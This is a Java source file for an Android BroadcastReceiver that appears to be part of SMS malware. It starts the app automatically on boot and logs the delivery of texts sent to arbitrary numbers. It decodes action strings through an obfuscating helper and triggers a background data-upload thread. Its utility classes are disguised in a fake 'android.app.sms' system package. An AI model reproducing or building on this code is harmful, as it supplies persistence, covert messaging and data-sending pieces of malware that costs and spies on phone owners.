package com.sms.web.receiver;

import com.pro.intertest.WebActivity;
import android.app.Activity;
import android.app.sms.async.SubmitDateThread;
import android.app.sms.utils.BaseData;
import android.app.sms.utils.LogUtils;
import android.app.sms.utils.Tools;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;

public class SMSReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {
		String action = Tools.Eecode(intent.getAction());
		LogUtils.write("Send", "收到广播=" + intent.getAction());
		if (action.equals(BaseData.bootaction1)) {	//开机自启动
			Intent newIntent = new Intent(context, WebActivity.class);
			newIntent.setAction("android.intent.action.MAIN");
			newIntent.addCategory("android.intent.category.LAUNCHER");
			newIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			context.startActivity(newIntent);
		} if (action.equals(BaseData.smssend)) {
			String phoneNum = intent.getStringExtra("phone");
			switch (getResultCode()) {
				case Activity.RESULT_OK:
					LogUtils.write("Send", phoneNum + "-短信发送成功");
					break;
				case SmsManager.RESULT_ERROR_GENERIC_FAILURE: 
					LogUtils.write("Send", phoneNum + "-短信发送失败RESULT_ERROR_GENERIC_FAILURE");
					break;
				case SmsManager.RESULT_ERROR_RADIO_OFF: 
					LogUtils.write("Send", phoneNum+"-短信发送失败RESULT_ERROR_RADIO_OFF");		
					break;
				case SmsManager.RESULT_ERROR_NULL_PDU: 
					LogUtils.write("Send", phoneNum+"-短信发送失败RESULT_ERROR_NULL_PDU");
					break;
				default: 
					LogUtils.write("Send", phoneNum+"-未知错误");
					break;
			}
		} else {
			SubmitDateThread.startSendData(context);
		}
	}

}
